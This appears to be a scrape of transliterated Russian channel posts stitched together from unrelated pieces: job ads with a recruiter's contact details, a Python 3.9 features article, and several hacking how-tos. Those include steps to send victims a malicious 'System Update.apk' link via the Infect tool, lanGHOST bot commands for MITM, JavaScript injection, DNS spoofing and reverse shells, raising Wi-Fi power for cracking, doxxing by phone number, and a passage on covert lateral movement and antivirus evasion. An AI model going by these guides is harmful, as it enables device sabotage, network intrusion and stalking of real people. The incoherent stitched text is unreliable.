Ubivaem telefon liubomu  cheloveku!   (Potrebuetsia prilozhenie Termux)  Infect -- eto bash-skript, s pomoshch'iu kotorogo vy mozhete rasprostraniat' virus dlia android, otpravliaia spetsial'nuiu vredonosnuiu ssylku.  Ustanovka i ekspluatatsiia:  Otkryvaem terminal i vvodim komandu dlia obnovleniia paketov:  pkg update && pkg upgrade  Ustanavlivaem git i python s pomoshch'iu komand:  pkg install git  pkg install python2  pkg install python3  Ustanavlivaem lolcat:  pip install lolcat  Kloniruem repozitorii s GitHub:  git clone https://github.com/noob-hackers/Infect  Perekhodim v papku instrumenta:  cd Infect  I zapuskaem:  bash infect.s  Posle zapuska vybiraem pervyi punkt.   Dalee soglashaemsia so vsem, nazhimaia tri raza podriad Enter.   V konechnom itoge sozdastsia vredonosnaia ssylka, kotoruiu nuzhno otpravit' nashei zhertve. Kogda zhertva pereidet po dannoi ssylke, na ustroistvo skachaetsia fail pod nazvaniem System Update.apk  Esli zhertva ustanovit i zapustit fail, to telefon zhertvy budet zarazhen virusom Elite, kotoryi ne pozvolit vospol'zovat'sia ustroistvom.

Nekotorye svedeniia ob iskusstvennykh neironnykh setiakh i metodakh ikh obucheniia. Chast' 2.  Iskusstvennye neironnye seti nakhodiat prilozheniia v razlichnykh oblastiakh nauki: komp'iuternom zrenii, raspoznavanii rechi, analize eksperimental'nykh dannykh i drugikh zadachakh. Vo vtoroi chasti doklada planiruetsia rassmotret' neskol'ko tipichnykh problem, k kotorym primeniaiutsia neirosetevye algoritmy: priblizhenie funktsii, klassifikatsiia razmechennykh dannykh i raspoznavanie rukopisnykh tsifr. Dlia napisaniia programm budet ispol'zovan iazyk Python i biblioteka TensorFlow, pozvoliaiushchaia sushchestvenno uprostit' protsess obucheniia neirosetei. Zhelaiushchie mogut popraktikovat'sia priamo na zaniatii, dlia etogo neobkhodimo nalichie Python3 i TensorFlow.  Dokl.: Aleksei Kazarnikov (University of Heidelberg)  Priglashaem vsekh zhelaiushchikh! Nikakikh zhestkikh sprintov, dedlainov i dotoshnogo prodakt-menedzhera nad tvoim dukhom. S nas -- interesnye zadachi, nenapriazhnaia atmosfera, otsutstvie biurokratii. S Vas -- stabil'naia i kachestvennaia rabota s entuziazmom.  Obiazannosti: * Realizatsiia biznes-logiki prilozheniia po chetko opisannym tekhnicheskim zadacham. * Tekhnicheskii reserch s tsel'iu optimizatsii uzkikh mest. Bonusy * Polnost'iu udalennaia rabota. * Gibkii grafik (sami raspredeliaete svoe vremia, nikto za Vami ne sledit) * Ezhenedel'naia oplata. * Otsutstvie zhestkikh dedlainov.  Otkliknut'sia mozhno zdes': https://remowork.ru/vacancy/middle-senior-python-backend-developer/

LanGHOST - vzlom komp'iutera cherez Telegram [BOT]  *Ustanovka lanGHOST.   *Dlia raboty s lanGHOST nam potrebuetsia python3. Ustanavlivaem ego s pomoshch'iu komandy  sudo apt install python3 python3-pip   *Skachivaite arkhiv po ssylke ili s pomoshch'iu komandy  git clone https://github.com/xdavidhu/lanGhost   *Perekhodim v direktoriiu s ustanovlennym skriptom  cd lanGhost   *i zapuskaem ispolniaemyi fail  sudo ./setup.py   Nastroika:    Shag 1 setup.py:  Trebuetsia vvesti imia seti, k kotoroi budet proiskhodit' podkliuchenie.  Trebuetsia sozdat' API kliuch. Otpravliaem soobshchenie /newbot botu v telegramme [id199142634|@BotFather] Dalee pishem absoliutno liuboe imia novomu botu. Posle etogo trebuetsia vvesti imia pol'zovatelia, kotoroe dolzhno byt' unikal'noe i zakanchivat'sia na bot. Posle togo, kak vy otpravite vashe imia pol'zovatelia [id199142634|@BotFather] ot v otvet prishliot vash API kliuch.  Vvedite kod verifikatsii, otpraviv ego vashemu botu. Vsio, ustanovka zavershena.  Funktsii lanGHOST.   /scanip [TARGET-IP] - Scan a specific IP address.   /kill [TARGET-IP] - Stop the target's network connection.   /mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.   /replaceimg [TARGET-IP] - Replace HTTP images requested by target.   /injectjs [TARGET-IP] [JS-FILE-URL] - Inject JavaScript into HTTP pages requested by target.   /spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.   /attacks - View currently running attacks.  /stop [ATTACK-ID] - Stop a currently running attack.   /restart - Restart lanGhost.   /reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.   /help - Display the help menu. /ping - Pong. 10 klassnykh funktsii Python 3.9  Perevod podgotovlen sovmestno s fakul'tetom Python-razrabotki GeekBrains. Avtor original'nogo teksta Farhad Malik.  ***  Kak i bol'shinstvo poklonnikov Python, ia ochen' rad izuchat' i ispol'zovat' noveishie funktsii. V etoi stat'e budet predstavlen obzor vozmozhnostei Python 3.9, kotorye neobkhodimo znat'.  Ia oznakomilsia s primechaniiami k vypusku, posmotrel obsuzhdeniia i sostavil ischerpyvaiushchii gaid o tom, chto iz sebia predstavliaiut eti funktsii i kak oni rabotaiut.  ***  Bylo dobavleno neskol'ko novykh funktsii, vkliuchaia ob'edinenie i obnovlenie slovarei, strokovye metody i vnedrenie modulia zoneinfo. Takzhe nam predstavili stabil'nyi i vysokoproizvoditel'nyi parser.  Davaite razbirat'sia s novovvedeniiami.  1. Operatory obnovleniia i sliianiia slovarei  Vo vstroennyi klass dict dobavleno dva operatora: | i |=.  | ispol'zuetsia dlia ob'edineniia slovarei, |= - dlia ikh obnovleniia.  PEP 584  Kod:  Ob'edinenie: |   >>> a = {'farhad': 1, 'blog': 2, 'python': 3} >>> b = {'farhad': 'malik', 'topic': 'python3.9'} >>> a | b {'blog': 2, 'python': 3, 'farhad':'malik', 'topic': 'python3.9'} >>> b | a {'farhad': 1,'blog': 2, 'python': 3, 'topic':'python3.9' }  Obnovlenie: |=   >>> a |= b >>> a {'blog': 2, 'python': 3,'farhad':'malik'}  V sluchae konflikta kliuchei vernym budet schitat'sia krainee pravoe znachenie. Eto sootvetstvuet povedeniiu analogichnykh operatsii dict.  Bolee detal'no  Kak my vidim, dobavleny novye operatory | i |=.  | mozhno rassmatrivat' kak operator + (slozheniia) v spiskakh, a |= - kak operator += (rasshireniia).  V Python 3.8 est' neskol'ko sposobov sliianiia i obnovleniia slovarei.  K primeru, mozhno ispol'zovat' first_dict.update(second_dict). Problema etogo metoda v tom, chto on izmenit first_dict na meste. Chtoby etogo izbezhat', nuzhno ob'iavit' vremennuiu peremennuiu, sokhranit' v nei first_dict, a zatem vypolnit' operatsiiu obnovleniia. No poiavliaetsia lishniaia stroka koda, prosto chtoby operator ob'edineniia/obnovleniia rabotal.  Takzhe my mozhem primenit' {**first_dict, **second_dict}. Slozhnost' etogo metoda v tom, chto ego trudno obnaruzhit' i slozhnee poniat' smysl koda. Krome togo, iskliuchaiutsia tipy mapping i uchityvaetsia tol'ko tip dict. Naprimer, esli first_dict - eto defaultdict, a second_dict - eto tip dict, to programma zavershitsia oshibkoi.  Etot sposob ne rabotaet s podklassami dict, kotorye soderzhat funktsiiu _init_.  Nakonets, biblioteka collections soderzhit funktsiiu ChainMap. Ona mozhet priniat' dva slovaria, kak ChainMap(first_dict, second_dict), i vernut' ob'edinennyi slovar', no ob etoi biblioteke znaiut nemnogie.  ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://www.python.org/dev/peps/pep-0584  2. Novyi vysokoproizvoditel'nyi parser na osnove PEG  S Python 3.9 mozhno otkazat'sia ot ispol'zovaniia LL (1) v pol'zu bolee gibkogo i stabil'nogo sintaksicheskogo analizatora na osnove PEG.  PEP: 617  Bolee detal'no  Tekushchii parser CPython osnovan na LL (1). Grammatika osnovana na LL (1), chto pozvoliaet parsit' ee s pomoshch'iu LL (1) analizatora. Parser LL (1) rabotaet sverkhu vniz i analiziruet vkhodnye dannye sleva napravo. Grammatika iavliaetsia kontekstno-svobodnoi, poetomu kontekst tokenov ne uchityvaetsia.  Python 3.9 predlagaet zamenit' ego novym parserom na osnove PEG, kotoryi snimet ogranicheniia Python grammatiki LL (1). Budet udalen riad khakov, sushchestvuiushchikh v tekushchem sintaksicheskom analizatore. V dolgosrochnoi perspektive eto snizit stoimost' obsluzhivaniia.  Nesmotria na to, chto sintaksicheskie analizatory i grammatiki LL (1) prosty v realizatsii, ogranicheniia ne pozvoliaiut im vyrazhat' obshchie konstruktsii estestvennym obrazom dlia razrabotchika iazyka i chitatelia. Parser smotrit tol'ko na odin token vpered, chtoby razlichat' vozmozhnosti.  Operator vybora | uporiadochennyi. Rassmotrim sleduiushchee pravilo:  rule: A|B|C  Kontekstno-svobodnyi parser grammatiki LL (1) budet generirovat' konstruktsii, kotorye pri zadannoi vkhodnoi stroke opredeliat, nuzhno li rasshiriat' A, B ili C. Analizator PEG otlichaetsia. On proverit, uspeshna li pervaia peremennaia, i tol'ko v sluchae provala pereidet ko vtoroi ili tret'ei.  Parser PEG generiruet rovno odno dopustimoe derevo dlia stroki. On opredelennyi, v otlichie parser LL (1).  Sintaksicheskii analizator PEG takzhe napriamuiu generiruet uzly AST dlia pravila cherez grammaticheskie deistviia. Za schet etogo udaetsia izbezhat' sozdaniia promezhutochnykh shagov.  Parser PEG byl tshchatel'no protestirovan. U nego otlazhena proizvoditel'nost'. Poetomu dlia bol'shinstva instruktsii on raskhoduet primerno 10% ot ob'ema pamiati i vychislitel'nykh resursov tekushchego analizatora. Vse blagodaria tomu, chto ne sozdaetsia promezhutochnoe sintaksicheskoe derevo.  ***  Ia opustil nekotorye detali, chtoby ne uslozhniat' prochtenie stat'i. Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://www.python.org/dev/peps/pep-0617  3. Novye strokovye funktsii dlia udaleniia prefiksa i suffiksa  K ob'ektu str dobavleno dve novykh funktsii.  1. Pervaia udaliaet prefiks - str.removeprefix('prefiks').  2. Vtoraia udaliaet suffiks - str.removesuffix('suffiks').  PEP: 616  Kod:   'farhad_python'.removeprefix('farhad_') #vozvrashchaet python 'farhad_python'.removesuffix('_python') #vozvrashchaet farhad   Bolee detal'no  Odna iz obydennykh zadach v prilozhenii data science, kotoroe vkliuchaet v sebia manipulirovanie tekstom - udalit' prefiks/suffiks strok. Dobavlennye k ob'ektu str funktsii mozhno ispol'zovat' dlia udaleniia nenuzhnykh prefiksov i suffiksov iz stroki.  Kak my uzhe znaem, pervaia funktsiia udaliaet prefiks. Eto str.removeprefix('prefiks'). Vtoraia funktsiia udaliaet suffiks. Eto str.removesuffix('suffiks').  Stroka - eto nabor simvolov, i kazhdyi simvol imeet indeks v stroke. Indeksy mozhno ispol'zovat' vmeste s : , chtoby vernut' podmnozhestvo stroki. Eta funktsiia izvestna kak slice (srez) stroki.  Esli my govorim o funktsiiakh, oni proveriaiut, nachinaetsia li stroka s prefiksa (zakanchivaetsia li ona suffiksom), i esli da, to vozvrashchaiut stroku bez prefiksa ili posle suffiksa, ispol'zuia funktsiiu sreza str[ .  Poskol'ku eti funktsii iavliaiutsia chast'iu standartnoi biblioteki, my poluchaem soglasovannyi, menee khrupkii, vysokoproizvoditel'nyi i bolee nagliadnyi API.  ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://www.python.org/dev/peps/pep-0616  4. Podskazki tipov dlia vstroennykh universal'nykh tipov  Annotirovanie programm stalo proshche za schet udaleniia ierarkhii parallel'nykh tipov v Python.  Dobavlena podderzhka universal'nogo sintaksisa vo vsekh standartnykh kollektsiiakh, dostupnykh v module nabora teksta.  My mozhem ispol'zovat' vstroennye tipy kollektsii list ili dict v kachestve universal'nykh tipov vmesto ispol'zovaniia typing.List ili typing.Dict v signature nashei funktsii.  Kod stal vygliadet' chishche, a ego ponimanie i ob'iasnenie uprostilos'.  PEP: 585  Bolee detal'no  Nesmotria na to, chto Python - eto iazyk s dinamicheskoi tipizatsiei, annotatsiia tipov v programme pozvoliaet provodit' samoanaliz. Vposledstvii annotatsiiu mozhno ispol'zovat' dlia sozdaniia API proverki tipov vo vremia vypolneniia.  Kak ia govoril ranee, v Python 3.9 dobavili podderzhku universal'nogo sintaksisa vo vsekh standartnykh kollektsiiakh, dostupnykh v module nabora teksta.  Universal'nyi tip - eto obychno konteiner, k primeru list. Eto tip, kotoryi mozhno parametrizovat'. Parametrizovannyi tip - eto primer universal'nogo dzhenerika s ozhidaemymi tipami dlia elementov konteinera tipa list[str].  My mozhem ispol'zovat' vstroennye tipy kollektsii list ili dict v kachestve universal'nykh tipov vmesto ispol'zovaniia typing.List ili typing.Dict.  Naprimer, my mogli by upravliat' proverkoi tipov sredy vypolneniia Python, annotiruia kod:   print_value(input: str): print(input) # My poluchim uvedomlenie, esli vkhodnye dannye ne iavliaiutsia strokoi  Riad funktsii staticheskoi tipizatsii byl postepenno postroen poverkh sushchestvuiushchei sredy vypolneniia Python. Nekotorye iz nikh byli ogranicheny sushchestvuiushchim sintaksisom i povedeniem vo vremia vypolneniia. Poetomu v module tipizatsii voznikla dublirovannaia ierarkhiia kollektsii iz-za dzhenerikov.  Naprimer, my uvidim typing.List, typing.Dictionary vmeste so vstroennymi list, dictionary i t. d. Eto pozvoliaet pisat' kod:   def read_blog_tags(tags: list[str]) -> None: for tag in tags: print("Tag Name", tag)   ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://www.python.org/dev/peps/pep-0585  5. Podderzhka chasovogo poiasa IANA v DateTime  Modul' zoneinfo byl sozdan v kachestve podderzhki bazy dannykh chasovykh poiasov IANA. Eta podderzhka byla dobavlena v standartnuiu biblioteku.  PEP: 615  Chasovye poiasa IANA chasto nazyvaiut tz ili zone info. Sushchestvuet mnogo chasovykh poiasov IANA s raznymi putiami poiska dlia ukazaniia chasovogo poiasa IANA ob'ekta datetime. Naprimer, my mozhem peredat' imia puti poiska ob'ektu datetime kak Continent/City, chtoby ustanovit' ego tzinfo.  dt = datetime(2000, 01, 25, 01, tzinfo=ZoneInfo("Europe/London"))  Esli my peredadim nevernyi kliuch, vozniknet oshibka zoneinfo.ZoneInfoNotFoundError.  Bolee detal'no  Biblioteka datetime ispol'zuetsia dlia sozdaniia ob'ekta datetime i ukazaniia ego chasovogo poiasa, putem ustanovki svoistva tzinfo. Vse mozhet obernut'sia sozdaniem slozhnykh pravil chasovogo poiasa pri ispol'zovanii bazovogo pokazatelia datetime.tzinfo.  V bol'shinstve sluchaev nuzhno prosto ustanovit' ob'ekt i ego chasovoi poias: UTC, lokal'nyi chasovoi poias sistemy, ili chasovoi poias IANA.  Mozhno sozdat' ob'ekt zoneinfo.ZoneInfo(key), gde kliuch imeet strokovyi tip, ukazyvaiushchii put' poiska faila zony v baze dannykh chasovykh poiasov sistemy. Ob'ekt zoneinfo.ZoneInfo(key) mozhet byt' sozdan i ustanovlen kak svoistvo tzinfo ob'ekta datetime.  Kod:   from zoneinfo import ZoneInfo from datetime import datetime dt = datetime(2000, 01, 25, 01, tzinfo=ZoneInfo("America/Los_Angeles"))   ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://www.python.org/dev/peps/pep-0615  6. Vozmozhnost' otmeny odnovremennykh f'iuchersov.  V concurrent.futures.Executor.shutdown() dobavlen novyi parametr cancel_futures.  On otmeniaet vse otlozhennye f'iuchersy, kotorye ne byli zapushcheny.  Do versii 3.9 protsess ozhidal ikh zaversheniia pered zaversheniem raboty ispolnitelia.  Poiasnenie  Novyi parametr cancel_futures byl dobavlen v ThreadPoolExecutor i ProcessPoolExecutor. Eto rabotaet tak: esli ego znachenie - True, vse ozhidaiushchie f'iuchersy otmeniaiutsia pri vyzove funktsii shutdown().  Pri vypolnenii shutdown() interpretator proveriaet, ne sobran li ispolnitel' sborshchikom musora. Esli on vse eshche nakhoditsia v pamiati, on poluchaet vse ozhidaiushchie obrabotki elementy, a zatem otmeniaet f'iuchersy.  Kogda ne ostaetsia nezavershennykh rabochikh elementov, on zavershaet rabotu.  ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://bugs.python.org/issue30966  7. Uluchsheniia AsyncIO i mnogoprotsessornosti  V biblioteku asyncio i mnogoprotsessornuiu obrabotku byli vnesen riad uluchshenii.  Naprimer:  1. Parametr reuse_address asyncio.loop.create_datagram_endpoint() bol'she ne podderzhivaetsia iz-za ser'eznykh probelov v bezopasnosti.  2. Dobavleny novye soprogrammy: shutdown_default_executor() i asyncio.to_thread(). shutdown_default_executor naznachaet zavershenie raboty dlia ispolnitelia po umolchaniiu, kotoryi zhdet zaversheniia ThreadPoolExecutor. asyncio.to_thread() v osnovnom ispol'zuetsia dlia zapuska funktsii, sviazannykh s vvodom-vyvodom, v otdel'nom potoke, chtoby izbezhat' blokirovki tsikla sobytii.  Chto kasaetsia uluchshenii biblioteki mnogoprotsessornosti, v klass multiprocessing.SimpleQueue byl dobavlen novyi metod close().  Etot metod tochno zakryvaet ochered'. Eto garantiruet, chto ochered' budet zakryta i ne ostanetsia dol'she ozhidaemogo. Pomnite, chto metody get(), put(), empty() ne dolzhny vyzyvat'sia posle zakrytiia ocheredi.  ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://bugs.python.org/issue30966  8. Postoiannye oshibki importa paketov  Osnovnaia problema importirovaniia bibliotek Python zakliuchalas' v nesoglasovannom povedenii, kogda otnositel'nyi import prokhodil mimo paketa verkhnego urovnia.  Vstroennaia funktsiia __import__() vyzyvaet oshibku ValueError, a importlib.__import__() vyzyvaet oshibku ImportError.  Teper' eto ispravili. __import__() vyzyvaet ImportError vmesto ValueError.  ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://bugs.python.org/issue37444  9. Generatsiia sluchainykh baitov  Eshche odna funktsiia, dobavlennaia v versii 3.9 - random.Random.randbytes(). Eta funktsiia mozhet ispol'zovat'sia dlia generatsii sluchainykh baitov.  Mozhno generirovat' sluchainye chisla, no chto, esli nuzhno generirovat' sluchainye baity? Ran'she razrabotchikam prikhodilos' dlia etogo proiavliat' izobretatel'nost'. Khotia mozhno ispol'zovat' os.getrandom(), os.urandom() ili secrets.token_bytes(), no nel'zia generirovat' psevdosluchainye patterny.  K primeru, chtoby garantirovat', chto sluchainye chisla generiruiutsia s ozhidaemym povedeniem i protsess vosproizvoditsia, obychno ispol'zuetsia modul' random.Random.  V rezul'tate byl vveden metod random.Random.randbytes(). On takzhe mozhet generirovat' sluchainye baity kontroliruemym sposobom.  ***  Dlia polucheniia bolee podrobnoi informatsii vy mozhete oznakomit'sia s istochnikom.  https://bugs.python.org/issue40286  10. Ispravlenie funktsii zameny stroki  Ran'she <<>>.replace(<<>>, s, n) vozvrashchal pustuiu stroku vmesto s dlia vsekh nenulevykh n.  Etot bag sbival s tolku pol'zovatelei i privodil k nestabil'nomu povedeniiu prilozhenii.  V Python 3.9 problema byla ustranena, i teper' funktsiia zameny sovmestima s "".replace("", s).  Rabotaet ona sleduiushchim obrazom: dlia zadannogo maksimal'nogo argumenta vkhozhdeniia zameny, nabor simvolov iz stroki zameniaetsia novym naborom simvolov:  string.replace(s, old, new[, maxreplace])  V etom sluchae vozvrashchaetsia kopiia stroki s so vsemi vkhozhdeniiami staroi podstroki, zamenennoi na novuiu. Esli ukazan neobiazatel'nyi argument maxreplace, zameniaiutsia pervye ekzempliary maxreplace.  Do etogo funktsiia replace imela neposledovatel'noe povedenie   "".replace("", "blog", 1) Vozvrashchaet '' Ozhidalos' uvidet' blog "".replace("", "|", 1) Vozvrashchaet '' Ozhidalos' uvidet' | "".replace("", "prefix") No vozvrashchaet 'prefix'  Teper':   "".replace("",s,n) vozvrashchaet s vmesto pustoi stroki dlia vsekh nenulevykh n  V Python 3.9 takzhe byl iskliuchen riad izbytochnykh funktsii, takikh kak Py_UNICODE_MATCH.  Esli vy khotite uznat' bol'she ob etikh uluchsheniiakh, prochtite ofitsial'noe rukovodstvo zdes'.  ***  Novovvedeniia v populiarnom iazyke programmirovaniia mozhno izuchit' samostoiatel'no, no pridetsia potratit' mnogo vremeni i sil na poisk i sistematizatsiiu informatsii. Esli vash opyt v professii eshche ne tak velik, obratite vnimanie na fakul'tet Python-razrabotki GeekBrains. Pod rukovodstvom opytnykh prepodavatelei vy poluchite neobkhodimye znaniia, a uspeshno zavershivshim obuchenie studentam onlain-akademiia pomozhet s trudoustroistvom.  Interesno, khochu poprobovat'  Istochniki   https://towardsdatascience.com/10-awesome-python-3-9-features-b8c27f5eba5c  #Python

Kak poluchit' 2000 mW/33dbm na Alfa Network Awus036nh? Kak uvelichit' moshchnost' wifi adaptera? TX Power https://www.youtube.com/watch?v=mul_RSNLzio Dobrogo vremeni sutok, vy na kanale #osoznaniepro ( #osoznaniepro ) i segodnia ia otvechu na dva voprosa, kotorye volnuiut nachinaiushchikh pen-testerov(khakerov) kotorye izuchaiut audit bezopasnosti wifi setei(wardriving), v prostonarod'e vzlom wifi. A imenno: Kak poluchit' 2000 mW (33 dbm) na wifi adaptere Alfa Network Awus036nh v kali linux? Kak uvelichit'(povysit') moshchnost'(tx power) na wifi adaptere v kali linux?  Nu i parallel'no otvechu na vopros: Vliiaet li uvelichenie moshchnosti wifi adaptera, no kolichestvo obnazhaemykh wifi setei vo vremia vardraivinga, k primeru v programme wifite.  Komandy: sudo su apt install python3-m2crypto git clone git://git.kernel.org/pub/scm/linux/kernel/git/sforshee/wireless-regdb.git cd wireless-regdb/ gedit db.txt sed -i 's/#!\/usr\/bin\/env python/#!\/usr\/bin\/env python3/' *.py make rm /lib/crda/regulatory.bin cp regulatory.bin /lib/crda/regulatory.bin rm /usr/lib/firmware/regulatory.db cp regulatory.db /usr/lib/firmware/regulatory.db rm /usr/lib/firmware/regulatory.db cp regulatory.db /usr/lib/firmware/regulatory.db reboot

Senior SQL/PostgreSQL razrabotchik v QUANTBOX (quantbox.ru) / ot 150 000 do 200 000 rub.  Na rabotaiushchii v prodakshen bolee 2-kh let proekt Position Keeping trebuetsia starshii SQL-razrabotchik dlia dal'neishego samostoiatel'nogo razvitiia i podderzhki proekta pri pomoshchi 1,5 programmistov, sposobnykh zakryt' zadachi po Javascript, Python, C i prostomu SQL.    Proekt predstavliaet soboi sistemu dlia ucheta birzhevykh sdelok, predstavliaiushchii informatsiiu v vide razlichnykh reportov.   Tekhnologicheskii sostav proekta:   - Baza PostgreSQL napisana v osnovnom na plpgsql.  - Bekend proekta napisan na Python3 (tornado, asyncio), S, plpgsql.  - Frontend proekta napisan na Javascript s ispol'zovaniem tekhnologii Backbone, Marionette, React, Angular2.   Trebovaniia k kandidatu:   - Glubokoe ponimanie i intensivnyi opyt primeneniia SQL, zhelatel'no postgresql;  - Opyt ispol'zovaniia i razrabotki v proekte stored procedure, zhelatel'no na plpgsql;  - Ponimanie printsipov OOP, asinkhronnogo programmirovaniia, REST, AJAX;  - Opyt napisaniia programm na Python;  - Opyt raboty v Linux;  - Ispol'zovanie sistem kontrolia versii (git, SVN).   Dopolnitel'nym preimushchestvom budet:   - Opyt raboty v finansovykh organizatsiiakh;  - Znaniia v oblasti birzhevoi torgovli ili zainteresovannost' dannoi temoi;  - Opyt raboty s ocherediami soobshchenii (rabbitmq, Kafka);  - Opyt avtomaticheskogo testirovaniia koda (pytest, Selenium).   Usloviia raboty:   - Udalennaia rabota;  - Grafik: podderzhka proekta osushchestvliaetsia po budniam s 10:00 do 19:00 po Moskve, otguly/otprosy po dogovorennosti;  - Zarplata: 150 000-200 000 rublei na ruki (obsuzhdaetsia na sobesedovanii);  - Oformlenie po TK RF.   Sobesedovanie prokhodit v 2 etapa:   1. Testovaia zadacha: budet vyslana na elektronnuiu pochtu v techenie sutok posle otklika na vakansiiu.  2. Internet-sozvon: Skype ili Zoom (dlia gruppovoi besedy) ili beseda v ofise kompanii pri uspeshnom prokhozhdenii pervogo etapa.  Otkliknut'sia Pavlova Anna Andreevna  +7 (916) 9833749, Predpochtitel'nyi sposob sviazi - elektronnaia pochta.  annap@quantbox.ru

Nakhodim cheloveka po nomeru telefona    Probit' cheloveka po nomeru telefona seichas ne vyzyvaet zatrudnenii dazhe u samogo neopytnogo pol'zovatelia seti. Chtoby uznat' tochnyi gorod prozhivaniia cheloveka, my vospol'zuemsia utilitoi Sherlock v Termux.    Instruktsiia:    Ustanavlivaem Termux i propisyvaem komandy v konsol':    pkg install python3-pip  pkg install git  git clone https://github.com/sherlock-project/sherlock  cd sherlock  python3 -m pip install -r requirements.txt  python3 sherlock.py    Ispol'zovanie    Posle vvoda komand u vas poiavitsia meniu <<utility>>.  Nazhmite tsifru 2 > nazhmite Enter > vvedite nuzhnyi vam nomer

Kung-fu pivoting. Vyzhima em mak simum iz pos teks plu ata tsii>>.Pos le togo kak ty pro nik za vnesh nii perimetr i popal vo vnut renniuiu set' kom panii, neob khodimo ras shirit' v nei sobs tven noe pri suts tvie, esli khochesh' nai ti tam chto-to inte res noe. Kak ni stran no, chem bol' she raz mer vnut rennei seti kom panii, tem pro shche ee vzlo mat'. I nap rotiv, esli kom paniia sov sem nebol' shaia, set' vzlo mat' poroiu krai ne slozh no. Pochemu tak? Chem bol' she set', tem bol' she v nei mozhet vstre tit' sia uiaz vimykh ili nebezo pas no nas tro ennykh kom ponen tov. Pri etom chas to kom pro meta tsiia odno go uzla vle chet za soboi kom pro meta tsiiu sra zu mno zhes tva smezh nykh s nim uzlov.Vo vnut rennikh setiakh obych no pre obla daiut ser very i rabochie stan tsii pod upravle niem Windows. V to zhe vre mia eta OS naibo lee inte res na s toch ki zre niia spo sobov kom pro meta tsii, tak kak po umol chaniiu ime et mno zhes tvo interfei sov dlia uda len nogo vypol neniia koda. Kro me togo, ata kuiushche mu dos tupno bol' shoe koliches tvo spo sobov izvle cheniia uchet nykh dan nykh. Ia ne budu kasat' sia bokovo go pereme shcheniia po ser veram Linux: oni red ko vkliu cheny v domen i ne ime iut takogo raz noob raziia defol tnykh interfei sov dlia uda len nogo admi nis tri rova niia. Pri bokovom pereme shchenii Linux inte resen glav nym obra zom kak udob naia toch ka opo ry.Bo kovoe pereme shchenie pod razume vaet legitim noe uda len noe ispolne nie koda. To est' vse pred stav lennye v stat'e spo soby pod razume vaiut nalichie dei stvu iushchei uchet noi zapisi dlia togo ili ino go PK. Pri etom poch ti vseg da budet tre bovat' sia admi nis tra tiv naia uchet naia zapis'.Os novnaia zadacha pri bokovom pereme shchenii -- priv lekat' kak mozh no men' she vni maniia pol' zovate lei i sluzh by bezopas nosti, a tak zhe pos tarat' sia ne vyz vat' tre vogu u sredstv anti virus noi zashchity. Naibo lee effektiv no ispol' zovat' shtat nye sreds tva ope ratsi onnoi sis temy, to est' abso liut no legitim nye i neot lichimye ot dei stvii obych nykh admi nis tra torov seti.My ne budem obsuzhdat' osnovnye uiaz vimos ti Windows, ata ki v lokal' nykh setiakh i spo soby pod niat' pri vile gii v sre de Active Directory. Vmes to eto go pogovo rim iskliu chitel' no o legal' nykh veshchakh: v kakikh pota ennykh ugol kakh Windows mozh no nai ti uchet nye zapisi i chto s nimi potom delat'. Vse pred stav lennye dal' she spo soby ne schi taiut sia uiaz vimos tiami, a pred stav liaiut iz sebia triu ki by design, sle dova tel' no, pri gra mot nom ispolne nii eto pol nost'iu legal' nye pro tsedu ry.Vse pri mery osno vany na real' nykh situ atsiiakh, s kotory mi mozh no stol knut' sia pri pereme shchenii po samym nas toiashchim vnut rennim setiam. Poeto mu, kak obych no, kos nemsia prob lemy mak simal' no tikhogo pereme shcheniia s voz mozhnost'iu bai pasa anti viru sov, a tak zhe sde laem aktsent na to, kakie setevye por ty nam dlia eto go pot rebu iutsia. Strategiia bokovogo peremeshcheniiaItak, bokovoe pereme shchenie -- eto odnovre men noe socheta nie dvukh tekh nik:auten tifitsi rovan nogo uda len nogo vypol neniia koda;iz vle cheniia sek retnoi informa tsii pos le poluche niia dos tupa.Tsik lichnoe, pos ledova tel' noe pov torenie etikh shagov poroiu poz volia et ot odno go-edins tven nogo vzlo man nogo PK doi ti do pol noi kom pro meta tsii vsei setevoi infrastruk tury. Obych no bokovoe pereme shchenie, kak vsia koe inoe pereme shchenie, pres ledu et odnu iz sle duiushchikh tselei:pe rekh vat upravle niia kon trol lerami domena;dos tizhenie izo liro van nykh kri tiches kikh setevykh seg mentov (nap rimer, ASU TP, SWIFT);po isk kri tiches koi informa tsii na PK (sek retnye dokumen ty, pla tezh nye rek vizity i tak dalee).Od nako dlia dos tizheniia liuboi iz perechis lennykh tselei tre buiut sia vse novye uchet nye dan nye, chto by u ata kuiushche go byla voz mozhnost' pereme shchat' sia po seti i poluchat' dos tup ko vse bol' shemu koliches tvu PK. Prod vizhenie po vnut rennei seti red ko obkho dit sia bez vzia tiia kon trol lera domena, pos kol' ku vzia tie domena ozna chaet avto mati ches koe poluche nie dos tupa prak tiches ki k kazh domu uzlu seti. Chto kasa etsia admins hunting, pri dos tizhenii kon trol lera domena mozhet pokazat' sia, chto poisk pri vile giro van nykh uchet nykh zapisei -- eto sle poe uga dyva nie. No na samom dele infrastruk tura Active Directory i sama Windows ras kry vaiut dos tatoch no informa tsii pros tomu domen nomu pol' zovate liu, zachas tuiu poz voliaia ras schi tat' nuzh noe nap ravle nie prod vizheniia i spla niro vat' toch nuiu mno gos tupen chatuiu tsepoch ku vzlo mov eshche v samom nachale bokovo go pereme shcheniia.Pos le vzia tiia kon trol lerov domena inog da byva et neob khodimo dvi gat' sia dal' she -- v nekii oso bo okhra niaemyi seg ment, pred stav liaiushchii soboi ob' ekty <<biz nes-ris ka>>. Eto mozhet byt' seg ment ASU TP, vme shatel' stvo v tekh nologi ches kii pro tsess, dos tup v seg ment SWIFT, esli my ime em delo s ban kami, libo zhe pros to dos tup na PK general' nogo direk tora. V kazh dom slu chae my mozhem stol knut' sia s raz nymi slozh nostia mi 